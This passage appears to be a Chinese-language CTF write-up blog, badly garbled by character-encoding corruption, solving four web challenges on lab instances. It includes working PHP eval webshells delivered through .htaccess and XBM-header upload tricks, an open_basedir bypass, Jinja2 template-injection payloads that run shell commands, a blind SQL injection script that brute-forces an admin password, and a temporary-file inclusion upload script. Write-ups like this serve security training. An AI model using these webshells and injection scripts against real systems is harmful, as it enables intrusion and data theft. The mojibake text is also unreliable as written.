¬¬ä¸€å‘¨é¢˜ç›®/image-20220210152821670.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152821670.png)ä¸è¿‡è¿˜æ˜¯æŒ‰ç…§åšé¢˜çš„å¥—è·¯æ¥å§ï¼ŒçœŸæ­£çš„æ¯”èµ›åº”è¯¥ä¸ä¼šå‡ºç°è¿™ç§æƒ…å†µã€‚æ—¢ç„¶rceèµ°ä¸é€šï¼Œé‚£å°±è¯•ä¸€è¯•æ–‡ä»¶ä¸Šä¼ å§[![image-20220210152933281](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›®/image-20220210152933281.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152933281.png)å„ç§é™åˆ¶éå¸¸å¤šï¼Œè¿™é‡Œé™åˆ¶äº†ä¸Šä¼ phpåç¼€çš„æ–‡ä»¶ï¼Œæ‰€ä»¥è¦æƒ³åŠæ³•ç»•è¿‡ï¼Œæœ€å…ˆæƒ³åˆ°çš„å°±ç®—.htaccessè§£æã€‚ä½†æ˜¯ä¸Šä¼ .htaccessä»ç„¶æœ‰[![image-20220210204915083](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›®/image-20220210204915083.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210204915083.png)è¿™ä¸ªå‡½æ•°é™åˆ¶ã€‚è§£å†³è¿™ä¸ªå‡½æ•°ï¼Œé‡‡ç”¨xbmæ ¼å¼ï¼ŒX Bit Map```åœ¨è®¡ç®—æœºå›¾å½¢å­¦ä¸­ï¼ŒX Windowç³»ç»Ÿä½¿ç”¨X BitMapï¼ˆXBMï¼‰ï¼Œä¸€ç§çº¯æ–‡æœ¬äºŒè¿›åˆ¶å›¾åƒæ ¼å¼ï¼Œç”¨äºå­˜å‚¨X GUIä¸­ä½¿ç”¨çš„å…‰æ ‡å’Œå›¾æ ‡ä½å›¾XBMæ•°æ®ç”±ä¸€ç³»åˆ—åŒ…å«å•è‰²åƒç´ æ•°æ®çš„é™æ€æ— ç¬¦å·å­—ç¬¦æ•°ç»„ç»„æˆã€‚å½“æ ¼å¼è¢«æ™®éä½¿ç”¨æ—¶ï¼ŒXBMé€šå¸¸å‡ºç°åœ¨æ ‡é¢˜ï¼ˆ.hæ–‡ä»¶ï¼‰ä¸­ï¼Œæ¯ä¸ªå›¾åƒåœ¨æ ‡é¢˜ä¸­å­˜å‚¨ä¸€ä¸ªæ•°ç»„ã€‚ä»¥ä¸‹Cä»£ç ç¤ºä¾‹äº†ä¸€ä¸ªXBMæ–‡ä»¶ï¼š#define test_width 16#define test_height 7static char test_bits[] = &#123;0x13, 0x00, 0x15, 0x00, 0x93, 0xcd, 0x55, 0xa5, 0x93, 0xc5, 0x00, 0x80,0x00, 0x60 &#125;;```åœ¨è¿™ä¸ªcæ–‡ä»¶ä¸­é«˜å’Œå®½éƒ½æ˜¯æœ‰#åœ¨å‰é¢çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å³ä½¿æŠŠå®ƒæ”¾åœ¨.htaccessæ–‡ä»¶ä¸­ä¹Ÿä¸ä¼šå½±å“.htaccessçš„å®é™…è¿è¡Œæ•ˆæœã€‚æ‰€ä»¥æˆ‘ä»¬åœ¨.htaccessé‡ŒåŠ ä¸Š```#define width 1337#define height 1337..........```å°±å¯ä»¥ç»•è¿‡ç»•è¿‡è¿™ä¸ªå‡½æ•°äº†ã€‚ä¸Šä¼ .htaccessæ–‡ä»¶åï¼Œè¦ä¸Šä¼ ä¸€ä¸ªéphpåç¼€çš„ä¸€å¥è¯æœ¨é©¬ï¼Œä½†æœ¬é¢˜ä¸­ä»ç„¶å¯¹<?è¿›è¡Œäº†æ£€æµ‹ã€‚è¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥ç»•è¿‡ã€‚1ã€å¯¹ä¸€å¥è¯æœ¨é©¬çš„å†…å®¹è¿›è¡Œbase64ç¼–ç ã€‚2ã€ä½¿ç”¨ utf-16be æ¥ç»•è¿‡ä¸‹é¢å…ˆé™„ä¸Šä¸¤ç§æ–¹æ³•çš„expï¼š1ã€```import requestsimport base64htaccess = b"""#define width 1337#define height 1337 AddType application/x-httpd-php .ahhhphp_value auto_append_file "php://filter/convert.base64-decode/resource=./shell.ahhh""""shell = b"GIF89a12" + base64.b64encode(b"<?php eval($_REQUEST['cmd']);?>")#è¿™é‡Œçš„GIF8912åé¢çš„12æ˜¯ä¸ºäº†ç¬¦åˆbase64 8ä¸ªå­—èŠ‚çš„ç¼–ç è§„èŒƒurl = "http://95670a2d-e895-4364-bb7b-94939098a4b6.node3.buuoj.cn/?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&%86=get_the_flag"files = &#123;'file':('.htaccess',htaccess,'image/jpeg')&#125;data = &#123;"upload":"Submit"&#125;response = requests.post(url=url, data=data, files=files)print(response.text)files = &#123;'file':('shell.ahhh',shell,'image/jpeg')&#125;response = requests.post(url=url, data=data, files=files)print(response.text)```æœ¬é¢˜phpç¯å¢ƒä¸º7.2ï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨`<script language="php">eval($_REQUEST['shell']);</script>`è¿™æ¡payload,æ‰€ä»¥å°†shell.haè¿›è¡Œbase64ç¼–ç ä¹‹åï¼Œåœ¨.htaccessæ–‡ä»¶ä¸­åˆ©ç”¨filter://åè®®å°†æ–‡ä»¶è§£ç ï¼Œä»è€Œè¾¾åˆ°ä¼ å…¥shellçš„ç›®çš„ã€‚å¾—åˆ°[![image-20220210212049717](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›®/image-20220210212049717.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210212049717.png)2ã€```SIZE_HEADER = b"\n\n#define width 1337\n#define height 1337\n\n"def generate_php_file(filename, script):    phpfile = open(filename, 'wb')     phpfile.write(script.encode('utf-16be'))    phpfile.write(SIZE_HEADER)    phpfile.close()def generate_htacess():    htaccess = open('.htaccess', 'wb')    htaccess.write(SIZE_HEADER)    htaccess.write(b'AddType application/x-httpd-php .lethe\n')    htaccess.write(b'php_value zend.multibyte 1\n')    htaccess.write(b'php_value zend.detect_unicode 1\n')    htaccess.write(b'php_value display_errors 1\n')    htaccess.close()        generate_htacess()generate_php_file("shell.lethe", "<?php eval($_GET['cmd']); die(); ?>")```åŒç†ä¸Šä¼ å³å¯[![image-20220210212639842](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›®/image-20220210212639842.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210212639842.png)ä¸€å¥è¯æœ¨é©¬æˆåŠŸåˆ©ç”¨ã€‚ä½¿ç”¨èšå‰‘æˆåŠŸè¿æ¥[![image-20220210212824536](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›®/image-20220210212824536.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210212824536.png)ä½†æ˜¯æ— æ³•è®¿é—®æ ¹ç›®å½•ã€‚éé¢„æœŸè§£ï¼šé‡‡ç”¨èšå‰‘è‡ªå¸¦æ’ä»¶è¿›è¡Œç»•è¿‡.[![image-20220210213427872](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›®/image-20220210213427872.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210213427872.png)é¢„æœŸè§£ï¼šç»•è¿‡open_basedirè¿™é‡Œç”±äºæ¶‰åŠçš„å†…å®¹æˆ‘è¿˜ä¸å¤ªç†è§£ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥æ”¾å‡ºpayloadï¼Œæœ‰å…´è¶£çš„å¤§ä½¬å¯ä»¥æ·±å…¥ç ”ç©¶ä¸€ä¸‹ã€‚```chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir("/"));```[![image-20220210214135619](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›®/image-20220210214135619.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210214135619.png)æ‰€æœ‰æ–‡ä»¶è¢«åˆ—ä¸¾å‡ºæ¥äº†ï¼Œä¸‹é¢è¯»å–flagå€¼å°±å¯ä»¥äº†ã€‚[![image-20220210214447849](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›®/image-20220210214447849.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210214447849.png)## [RootersCTF2019]I_<3_Flask 10 11 15 2021 2022 è¿™é“é¢˜æ˜¯æ¨¡æ¿æ³¨å…¥ã€‚ [![image-20220211102608147](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›® image-20220211102608147.png)](https: sakurahack-y.github.io 02 rootersctf2019-i-3-flask-0x70-0x7f image-20220211102608147.png) é¦–å…ˆæŸ¥çœ‹æºä»£ç ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨ã€‚ [![image-20220211102910418](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›® image-20220211102910418.png)](https: image-20220211102910418.png) dirsearchçˆ†ç ´ä¸€ä¸‹ï¼Œä»€ä¹ˆä¹Ÿæ²¡æœ‰ã€‚ [![image-20220211102929099](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›® image-20220211102929099.png)](https: image-20220211102929099.png) æœ¬é¢˜æ˜¯flaskç±»é¢˜ç›®ï¼Œctfå¸¸è€ƒç‚¹ä¸è¿‡å°±æ˜¯æ¨¡æ¿æ³¨å…¥ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯»æ‰¾å¯æ³¨å…¥å‚æ•°ï¼Œæœ¬åœ°å¹¶æ²¡æœ‰ç»™å‡ºï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±å»çˆ†ç ´ã€‚ æˆ‘ä»¬è¿™é‡Œé‡‡ç”¨arjunå·¥å…·è¿›è¡Œçˆ†ç ´ã€‚å·¥å…·é“¾æ¥ï¼šhttps: github.com s0md3v arjun [![image-20220211110028885](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›® image-20220211110028885.png)](https: image-20220211110028885.png)æœ€ç»ˆå¯çˆ†ç ´å‡ºæ¥å‚æ•°nameã€‚ [![image-20220211105238512](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›® image-20220211105238512.png)](https: image-20220211105238512.png) [![image-20220211105250064](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›® image-20220211105250064.png)](https: image-20220211105250064.png) æµ‹è¯•äº†ä¸€ä¸‹çš„ç¡®å­˜åœ¨æ¨¡æ¿æ³¨å…¥ã€‚ æ¥ä¸‹æ¥å°±æ˜¯å¯¹æ¼æ´çš„åˆ©ç”¨ã€‚ **æ¼æ´åˆ©ç”¨** **1ã€å·¥å…·tplmap** [![image-20220211110242684](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›® image-20220211110242684.png)](https: image-20220211110242684.png) [![image-20220211110254561](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›® image-20220211110254561.png)](https: image-20220211110254561.png) æˆåŠŸï¼Œå‘ç°ä¸ºjinja2æ¨¡æ¿ï¼Œåœ¨ctfé¢˜ç›®ä¸­ç»å¸¸è€ƒå¯Ÿ ç›´æ¥â€“os-shellæ‹¿ä¸‹shellï¼Œè¯»å–flag [![image-20220211110436293](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›® image-20220211110436293.png)](https: image-20220211110436293.png) **2ã€æ‰‹å·¥åˆ©ç”¨** åªä¼šå·¥å…·å½“ç„¶ä¸è¡Œï¼Œæœ‰æ—¶å€™å·¥å…·æ— æ³•æˆåŠŸï¼Œå°±éœ€è¦è‡ªå·±æ‰‹åŠ¨æµ‹è¯•ï¼Œæ‰€ä»¥å¦‚ä½•æ‰‹æ’¸ä¹Ÿæ˜¯éœ€è¦æŒæ¡çš„ã€‚ å…·ä½“å¯å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼Œä¸œè¥¿å¾ˆå¤šä¸”æ‚ï¼Œå†™ç»™è‡ªå·±çœ‹çš„å¤§ä½¬åˆ«å–·æˆ‘ã€‚ [https: ssti-flak%e6%a1%86%e6%9e%b6 ](https: ssti-flakæ¡†æ¶ ) é¦–å…ˆç»™å‡ ä¸ªæ¯”è¾ƒé€šç”¨çš„payload ``` http: b8ef4c5f-f8bd-40de-acd4-c17dec6fb0d6.node4.buuoj.cn:81 ?name="&#123;%" for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__="='catch_warnings'" %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") &#125;&#125;&#123;% endif endfor %&#125; [![image-20220211111654284](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›® image-20220211111654284.png)](https: image-20220211111654284.png) [].__class__.__base__.__subclasses__() &#123;% 'catch_warnings' b c.__init__.__globals__.values() b.__class__="=" &#123;&#125;.__class__ 'eval' b.keys() &#123;&#123; b['eval']('__import__("os").popen("whoami").read()') &#125;&#125; < code></3_Flask></code></pre><p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211111724780.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211111724780.png" alt="image-20220211111724780"></a></p><p>ç„¶åæˆ‘ä»¬å†è®²ä¸€è®²è‡ªå·±å¦‚ä½•æ’¸å‡ºæ¥ä¸€ä¸ªpayloadï¼Œåšæ³•å°±æ˜¯å¯»æ‰¾å¯åˆ©ç”¨çš„ç±»ã€‚</p><p>1ã€æœ‰popen()çš„ç±»</p><pre><code>os._wrap_closepayload:&#123;&#123;"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><p>2ã€æœ‰osæ¨¡å—çš„</p><p>socket._socketobjectï¼ˆä¸€èˆ¬åœ¨71ï¼‰ã€site._Printerç­‰æ¨¡å—</p><pre><code>payload:&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen(cat /xxx/flag)&#125;&#125;</code></pre><p>3ã€æœ‰builtinsçš„ç±»</p><p>__ builtins __ä»£ç æ‰§è¡Œï¼ˆæœ€å¸¸ç”¨çš„æ–¹æ³•ï¼‰</p><p>warnings.catch_warningså«æœ‰,å¸¸ç”¨çš„è¿˜æœ‰email.header._ValueFormatter</p><p>__ builtins __   æ˜¯ä¸€ä¸ªåŒ…å«äº†å¤§é‡å†…ç½®å‡½æ•°çš„ä¸€ä¸ªæ¨¡å—ï¼Œæˆ‘ä»¬å¹³æ—¶ç”¨pythonçš„æ—¶å€™ä¹‹æ‰€ä»¥å¯ä»¥ç›´æ¥ä½¿ç”¨ä¸€äº›å‡½æ•°æ¯”å¦‚absï¼Œmaxï¼Œå°±æ˜¯å› ä¸º__ builtins   __ è¿™ç±»æ¨¡å—åœ¨Pythonå¯åŠ¨æ—¶ä¸ºæˆ‘ä»¬å¯¼å…¥äº†ï¼Œå¯ä»¥ä½¿ç”¨dir(__ builtins __ )æ¥æŸ¥çœ‹è°ƒç”¨æ–¹æ³•çš„åˆ—è¡¨ï¼Œç„¶åå¯ä»¥å‘ç°__   builtins __ ä¸‹æœ‰evalï¼Œ__ import __ç­‰çš„å‡½æ•°ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨æ­¤æ¥æ‰§è¡Œå‘½ä»¤ã€‚</p><p>å¥½äº†ï¼Œæ¥ä¸‹æ¥è¿›è¡Œå®è·µã€‚</p><p>æˆ‘ä»¬æŠŠæ‰€æœ‰å­ç±»åˆ—å‡ºæ¥</p><p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112131255.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211112131255.png" alt="image-20220211112131255"></a></p><p>å¥½å®¶ä¼™å‡ºæ¥äº†å¾ˆå¤šå•Šï¼Œæˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°æˆ‘ä»¬éœ€è¦çš„å°±å¥½ï¼Œæˆ‘ä»¬ç”¨pythonè„šæœ¬è·‘ä¸€ä¸‹</p><pre><code>import jsona = &quot;&quot;&quot;&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;&quot;&quot;&quot;num = 0allList = []result = &quot;&quot;for i in a:    if i == &quot;&gt;&quot;:        result += i        allList.append(result)        result = &quot;&quot;    elif i == &quot;\n&quot; or i == &quot;,&quot;:        continue    else:        result += i        for k,v in enumerate(allList):    if &quot;os._wrap_close&quot; in v:        print(str(k)+&quot;---&gt;&quot;+v)</code></pre><p>æˆ‘ä»¬å…ˆæ¥æ‰¾ä¸‹os._wrap_close</p><p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112532522.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211112532522.png" alt="image-20220211112532522"></a></p><p>å·²ç»å‡ºæ¥äº†åœ¨132ä½ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ„é€ ä¸€ä¸ªpayload</p><pre><code>&#123;&#123;"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><p>æˆ‘ä»¬æ¥æµ‹è¯•ä¸€ä¸‹æ˜¯å¦å¯ä»¥</p><p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112709595.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211112709595.png" alt="image-20220211112709595"></a></p><p>æˆåŠŸåˆ—å‡ºæ¥äº†æ–‡ä»¶ã€‚</p><p>ç›´æ¥è¯»å–flag</p><p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112747491.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211112747491.png" alt="image-20220211112747491"></a></p><p>åŒç†ï¼Œå¯ä»¥åˆ©ç”¨çš„ç±»è¿˜æœ‰å¾ˆå¤šå•Šï¼Œ</p><p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112931751.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211112931751.png" alt="image-20220211112931751"></a></p><p>å°±åƒè¿™ä¸ªç±»ä¹Ÿåœ¨é‡Œé¢åŒ…å«ç€ï¼Œæˆ‘ä»¬åŒæ ·å¯ä»¥åˆ©ç”¨å®ƒæ¥è·å–flagã€‚</p><p>æ–¹æ³•æœ‰å¾ˆå¤šï¼Œç†è§£åŸç†å¹¶æŒæ¡å…¶ä¸­å‡ ç§æ–¹æ³•å³å¯ã€‚</p><h2 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h2><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402142608573.png" alt="image-20220402142608573"></p><p>è¿›å»ä»¥åç›´æ¥ç»™ä½ äº†sqlè¯­å¥ã€‚</p><p>å…ˆä¸ç®¡åˆ«çš„æ‰«ä¸€ä¸‹ç›®å½•å†è¯´</p><p>å‘ç°xxx/robots.txtæ–‡ä»¶</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402143249697.png" alt="image-20220402143249697"></p><p>å†åˆ°hin.txtæŸ¥çœ‹<br><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402143334665.png" alt="image-20220402143334665"></p><p>ç»™å‡ºäº†è¿‡æ»¤å¾—å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”è¯´çš„å¾ˆæ˜ç™½å¦‚æœå¾—åˆ°adminå¾—å¯†ç å°±å¯ä»¥å¾—åˆ°flagï¼Œä½†æ˜¯è¿™é‡Œå¾—è¿‡æ»¤æ˜¯éå¸¸ä¸¥æ ¼å¾—ã€‚</p><p>fuzzä¸€ä¸‹</p><p>å‘ç°regexpæ²¡æœ‰è¢«è¿‡æ»¤</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402143542801.png" alt="image-20220402143542801"></p><p>sqlè¯­å¥æ˜¯</p><pre><code>select * from users where username = &#39;&#39; and passwd = &#39;&#39;</code></pre><p>æˆ‘ä»¬å¯ä»¥å†usernameä¸­åŠ åæ–œæ æ³¨é‡Šæ‰å•å¼•å·</p><pre><code>select * from users where username = &#39;aaa\&#39; and passwd = &#39;||/**/passwd/**/regexp/**/&quot;^a&quot;;%00&#39;</code></pre><p>å¯¹aè¿›è¡Œä¸€ä¸ªç®€å•å¾—fuzzï¼Œåˆ¤æ–­æˆåŠŸæ—¶å¾—å“åº”åŒ…</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402160348046.png" alt="image-20220402160348046"></p><p>å‘ç°yï¼Œå“åº”åŒ…æ˜¯ä¸€ä¸ª302è·³è½¬ï¼Œåˆ°welcome.php</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402160421355.png" alt="image-20220402160421355"></p><p>æ ¹æ®è¿™ä¸ªå°±å¯ä»¥ç¼–å†™å‡ºpayload</p><pre><code class="python">import timeimport requestsimport stringfrom urllib import parseres = &#39;&#39;url = &#39;http://494b5c51-766a-475c-b86d-320809ca2d50.node4.buuoj.cn:81/index.php&#39;string = string.digits + string.ascii_lowercase + &#39;_&#39; # çŒœæµ‹å¯†ç ç”±æ•°å­—ï¼Œå°å†™å­—æ¯å’Œä¸‹åˆ’çº¿ç»„æˆfor i in range(0, 200):    for s in string:        data = &#123;            &quot;username&quot;: &quot;sakura\\&quot;,            &quot;passwd&quot;: &quot;||/**/passwd/**/regexp/**/\&quot;^&#123;&#125;\&quot;;&#123;&#125;&quot;.format((res+s), parse.unquote(&#39;%00&#39;))        &#125;        response = requests.post(url, data)        print(response)        time.sleep(0.5)        if &quot;welcome&quot; in response.text:            res = res + s            print(res)        else:            continue</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403130031558.png" alt="image-20220403130031558"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403130154421.png" alt="image-20220403130154421"></p><h2 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2><p>è¿›å»ç›´æ¥æ˜¾ç¤ºè¿™ä¸ª</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403130428719.png" alt="image-20220403130428719"></p><p>æŸ¥çœ‹æºä»£ç ï¼Œç–‘ä¼¼hashé•¿åº¦æ‰©å±•æ”»å‡»</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403130441800.png" alt="image-20220403130441800"></p><p>æŠ“å–è¯·æ±‚åŒ…ï¼Œå‘ç°hashå€¼</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403131445202.png" alt="image-20220403131445202"></p><p>ç›´æ¥passä¼ ä¸€ä¸‹ï¼Œå‘ç°æç¤ºæ–‡ä»¶</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403132151777.png" alt="image-20220403132151777"></p><p>å‘ç°æ–‡ä»¶åŒ…å«</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403132341966.png" alt="image-20220403132341966"></p><p>æ‰«ä¸€ä¸‹ç›®å½•</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403140421790.png" alt="image-20220403140421790"></p><p>è¯»å–ä¸‹æºç </p><p>index.php</p><pre><code class="php">&lt;?phpinclude &#39;config.php&#39;;@$name=$_GET[&#39;name&#39;];@$pass=$_GET[&#39;pass&#39;];if(md5($secret.$name)===$pass)&#123;    echo &#39;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;           window.location.href=&quot;flflflflag.php&quot;;    &lt;/script&gt;&#39;;&#125;else&#123;    setcookie(&quot;Hash&quot;,md5($secret.$name),time()+3600000);    echo &quot;username/password error&quot;;&#125;?&gt;&lt;html&gt;&lt;!--md5($secret.$name)===$pass --&gt;&lt;/html&gt;</code></pre><p>flflflflag.php</p><pre><code class="php">&lt;html&gt;&lt;head&gt;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;           window.location.href=&quot;404.html&quot;;&lt;/script&gt;&lt;title&gt;this_is_not_fl4g_and_Ã¥Â‡ÂºÃ©Â¢Â˜Ã¤ÂºÂº_wants_girlfriend&lt;/title&gt;&lt;/head&gt;&lt;&gt;&lt;body&gt;&lt;?php$file=$_GET[&#39;file&#39;];if(preg_match(&#39;/data|input|zip/is&#39;,$file))&#123;    die(&#39;nonono&#39;);&#125;@include($file);echo &#39;include($_GET[&quot;file&quot;])&#39;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>config.php</p><pre><code class="php">&lt;?php$secret=&#39;%^$&amp;$#fffdflag_is_not_here_ha_ha&#39;;?&gt;</code></pre><p>dir.php</p><pre><code class="php">&lt;?phpvar_dump(scandir(&#39;/tmp&#39;));?&gt;</code></pre><p>ç”±äºä¼ªåè®®è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½åˆ©ç”¨ä¼ªåè®®è¿›è¡Œå†™é©¬ï¼Œè¿™é‡Œè€ƒå¯Ÿå¾—æ˜¯phpä¸´æ—¶æ–‡ä»¶åŒ…å«</p><p>php7 segment faultç‰¹æ€§:<br>php://filter/string.strip_tags=/etc/passwd<br>phpæ‰§è¡Œè¿‡ç¨‹ä¸­å‡ºç° Segment Faultï¼Œè¿™æ ·å¦‚æœåœ¨æ­¤åŒæ—¶ä¸Šä¼ æ–‡ä»¶ï¼Œé‚£ä¹ˆä¸´æ—¶æ–‡ä»¶å°±ä¼šè¢«ä¿å­˜åœ¨/tmpç›®å½•ï¼Œä¸ä¼šè¢«åˆ é™¤</p><p>å…·ä½“å¯å‚é˜…æ–‡ç« :<a href="https://www.cnblogs.com/linuxsec/articles/11278477.html">https://www.cnblogs.com/linuxsec/articles/11278477.html</a></p><p>payload:</p><pre><code>import requestsfrom io import BytesIOurl = &#39;http://bcd936cd-a002-414f-ba12-3fabf74c16ae.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&#39;payload = &quot;&lt;?php eval($_POST[&#39;x&#39;]) ?&gt;&quot;files = &#123;    &quot;file&quot;: BytesIO(payload.encode())&#125;try:    requests.post(url=url, files=files, allow_redirects=False)except:    print(&quot;false&quot;)</code></pre><p>æŸ¥çœ‹dir.phpï¼ŒæˆåŠŸå†™å…¥æ–‡ä»¶</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403144556928.png" alt="image-20220403144556928"></p><p>æ‰§è¡Œä¸€å¥è¯æœ¨é©¬ï¼Œflagåœ¨phpinfoä¸­</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403145618596.png" alt="image-20220403145618596"></p><p><img 